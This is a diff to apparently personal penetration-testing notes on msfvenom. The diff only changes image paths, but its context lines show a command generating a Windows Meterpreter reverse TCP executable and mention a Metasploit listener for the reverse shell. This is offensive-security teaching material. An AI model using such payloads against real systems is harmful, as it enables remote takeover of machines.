@@ -45,7 +45,7 @@ or
 msfvenom --list payloads
 ```
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260524224708.png)
+![](../../../../../Images/Pasted%20image%2020260524224708.png)
 
 ---
 
@@ -53,7 +53,7 @@ msfvenom --list payloads
 
 To display all supported output formats:
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260524224801.png)
+![](../../../../../Images/Pasted%20image%2020260524224801.png)
 
 ---
 
@@ -65,19 +65,19 @@ msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.227.128 LPO
 
 This generates a **64-bit Windows Meterpreter reverse TCP payload** in executable (`.exe`) format.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260524225511.png)
+![](../../../../../Images/Pasted%20image%2020260524225511.png)
 
 ---
 
 # Generate a 32-bit Windows Payload
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260524225634.png)
+![](../../../../../Images/Pasted%20image%2020260524225634.png)
 
 ---
 
 # Generate a Linux Payload
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260524230049.png)
+![](../../../../../Images/Pasted%20image%2020260524230049.png)
 
 ---
 
@@ -87,4 +87,4 @@ After generating the payload, you need a listener to receive the incoming revers
 
 This is typically done using the **Multi/Handler** module in Metasploit.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260524230350.png)
+![](../../../../../Images/Pasted%20image%2020260524230350.png)
